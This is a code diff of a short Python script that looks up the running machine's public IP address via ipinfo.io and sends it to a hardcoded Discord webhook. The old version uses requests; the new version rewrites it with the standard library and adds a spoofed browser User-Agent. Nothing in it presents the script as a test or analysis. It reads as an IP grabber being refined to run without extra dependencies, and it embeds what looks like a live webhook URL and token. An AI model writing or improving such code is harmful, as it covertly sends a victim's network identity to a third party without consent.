@@ -1,6 +1,18 @@
-import requests 
-ip = requests.get("http://ipinfo.io/ip")
-contents = {
-        "content": ip
-        }
-requests.post("https://discord.com/api/webhooks/1531732575473635469/uFjUG_Vk89WtpFF2XcvA_6bUrZsexqIDWyWLxwoz8Fh5c5c8Tj4_Lni567sSWZZy_VUZ", data=contents)
+import urllib.request
+
+with urllib.request.urlopen("http://ipinfo.io/ip") as response:
+    ip = response.read().decode('utf-8').strip()
+
+raw_payload = f'{{"content": "{ip}"}}'
+data = raw_payload.encode('utf-8')
+
+webhook_url = "https://discord.com/api/webhooks/1531732575473635469/uFjUG_Vk89WtpFF2XcvA_6bUrZsexqIDWyWLxwoz8Fh5c5c8Tj4_Lni567sSWZZy_VUZ"
+req = urllib.request.Request(
+    webhook_url, 
+    data=data, 
+    headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
+    method="POST"
+)
+
+with urllib.request.urlopen(req) as response:
+    pass
